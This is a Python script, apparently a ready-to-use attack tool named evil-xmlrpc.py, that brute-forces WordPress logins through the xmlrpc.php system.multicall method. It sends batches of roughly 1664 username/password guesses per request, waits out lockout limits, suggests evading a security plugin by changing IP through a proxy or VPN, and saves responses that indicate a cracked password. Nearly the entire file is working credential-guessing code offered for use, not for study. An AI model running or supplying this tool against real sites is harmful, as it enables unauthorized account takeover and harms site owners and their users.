#!/usr/bin/python3

# Created by: NewLayer

import time
import os
import requests
import sys

ascii_art = '''
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                   
██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗███████╗        
██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝        
██║ █╗ ██║██║   ██║██████╔╝██║  ██║██████╔╝██████╔╝█████╗  ███████╗███████╗        
██║███╗██║██║   ██║██╔══██╗██║  ██║██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║        
╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝██║     ██║  ██║███████╗███████║███████║        
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝        
                                By NewLayer
                             Discord: newlayer
'''

print(ascii_art + '\n')

def generate_payload(username, password):
    final_payload = "\n<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>" + username + "</string></value><value><string>" + password + "</string></value></data></array></value></data></array></value></member></struct></value>\n"
    with open('payload_file', 'a') as f:
        f.write(final_payload)

def check_site_vulnerability(url):
    print("[*] Checking if the site is vulnerable...")
    req = requests.get(url + '/xmlrpc.php')
    if req.text.strip() == "XML-RPC server accepts POST requests only.":
        print("[*] The site is vulnerable!")
    elif req.status_code == 403:
        print("[*] 403 Status code, possibly blocked by iThemes Security Plugin - Change IP Using Proxy or VPN")
        exit()
    else:
        print("[*] The site is not vulnerable.\n")
        exit()

def countdown(timer):
    while timer:
        mins, secs = divmod(timer, 60)
        timer_str = "[*] Till next requests: " + '{:02d}:{:02d}'.format(mins, secs)
        print(timer_str, end="\r")
        time.sleep(1)
        timer -= 1

def main(start, end):
    with open(password_list, 'r') as f:
        for count, line in enumerate(f):
            pass
        total_lines = count + 1
        print("[*] The file has %s lines" % total_lines)

    global attempt
    attempt = 0
    attempt_tracker = 0

    while end < total_lines:
        attempt += 1
        attempt_tracker += 1

        if attempt_tracker == 5:
            print("\n[*] Waiting 5 mins to prevent lockout...")
            countdown(300)
            attempt_tracker = 1
            print("[*] Continuing..")

        print("\n[*] Sending Payload.. \n[*] Attempt: %s " % attempt)
        print("[*] Target User: %s" % target_user)
        print("[*] Using lines %s to %s from the password list" % (start, end))

        lines_in_file = pass_list[start:end]
        os.system('del payload_file')

        with open('payload_file', 'w') as m:
            m.write(top_part)

        with open('payload_file', 'a') as z:
            for l in lines_in_file:
                if "&" not in l:
                    generate_payload(target_user, l)
            z.write(bottom_part)

        with open('payload_file', 'r') as k:
            send_me = k.read()
            send_data(send_me)

        start = end + 1
        end = end + 1664
        time.sleep(5)

    print("[*] Done")

def send_data(x):
    data = x
    final_url = target_url + "/xmlrpc.php"
    header = {"Content-Type": "application/xml"}
    req = requests.post(final_url, data.encode('utf-8'), headers=header)
    content_length = len(req.text)

    if req.status_code == 200:
        pass
    elif req.status_code == 403:
        print("[*] 403 Status code, possibly blocked by iThemes Security Plugin - Change IP Using Proxy or VPN")
        exit()
    else:
        print("[*] Quitting")
        exit()

    if "wp.service.controller" in req.text:
        print("\n[*] Password Cracked!")
        print("[*] Saving response as 'xml_rpc_CRACKED'")
        print("[*] Content Length: %s" % (content_length))
        with open('xml_rpc_CRACKED', 'w') as w:
            w.write(req.text)
            exit()

    elif "parse error. not well formed" in req.text:
        print("\n[*] Error: File likely too big. The limit is 1666.")
        print("[*] Saving response as 'xml_rpc_response_ERROR'")
        print("[*] Content Length: %s" % (content_length))
        with open('xml_rpc_response_ERROR', 'w') as m:
            m.write(req.text)
            exit()

    else:
        print("[*] Content Length: %s" % (content_length))
        if content_length != 356069:
            print("[*] Interesting.. Saving response..")
            file_name = "xml_rpc_response_interesting_" + str(content_length) + "_attempt_" + str(attempt)
            with open(file_name, 'w') as t:
                t.write(req.text)
        print("[*] Password Not Cracked.")
        print("[*] Saving response as 'xml_rpc_response'")
        with open('xml_rpc_response', 'a') as t:
            t.write(req.text)

try:   
    password_list = sys.argv[1]
    target_user = sys.argv[2]
    target_url = sys.argv[3]
    
    top_part = "<?xml version='1.0' encoding='utf-8'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    bottom_part = "</data></array></value></param></params></methodCall>"

    # Check if the target is vulnerable
    check_site_vulnerability(target_url)

    with open(password_list, 'r') as line:
            pass_list = line.readlines()
    # Adjust values here    
    main(0, 1664)
        
except IndexError:
    print("[*] Something is missing...")
    print("[*] Ex. python3 evil-xmlrpc.py <passlist> <user> <https://examplesite.com>")
